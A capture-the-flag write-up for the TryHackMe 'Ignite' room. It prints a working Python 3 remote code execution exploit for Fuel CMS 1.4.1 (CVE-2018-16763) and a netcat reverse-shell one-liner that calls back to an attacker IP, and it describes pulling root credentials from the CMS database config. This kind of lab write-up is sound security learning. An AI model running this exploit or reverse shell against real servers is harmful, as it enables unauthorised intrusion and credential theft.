---
layout: default
title: Ignite
parent: TryHackMe
grand_parent: CTF (writeup)
last_modified_date: 2 FEB 2022 23:20
permalink: /ctf/tryhackme/ignite.html
---
CTF
{: .label}

Room: [tryhackme.com/room/ignite](https://tryhackme.com/room/ignite)

## Reconnaissance
![nmap](/images/ignite00.jpg)

nmap scan show it has webserver running


![fuel](/images/ignite01.jpg)
lets find exploit for fuel cms version 1.4

___
## Gain access

![searchsploit](/images/ignite02.jpg)

Exploit: [exploit-db.com/exploits/47138](https://www.exploit-db.com/exploits/47138)

Orginally the exploit is written in python2 & using burpsuite proxy. 
Python2 is dead so i change it to python3 & comment the proxy section since i will not using it.

The code:
``` python
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763


import requests
import urllib

url = "http://10.10.32.4"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(xxxx)+"%27%29%2b%27"
	proxy = {"http":"http://10.10.3"}
	r = requests.get(burp0_url)#, proxies=proxy)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print(r.text[0:dup])
```
lets bind reverse shell

Reference: [[pentestmonkey.net](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)]

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.58.14 4444>/tmp/f
```

![revshell](/images/ignite03.jpg)

flag 1 is user.txt so is located on user directory

## PrivEsc

I need to gain root privilege to get root.txt
the webpage said the database is located on ```fuel/application/config/database.php```. I dig into it to find root credentials.

![database](/images/ignite04.jpg)

because you can't change user in this shell. I need to change it.
``` bash
python -c 'import pty; pty.spawn("/bin/bash")'
```


Aaaaand it's done :D
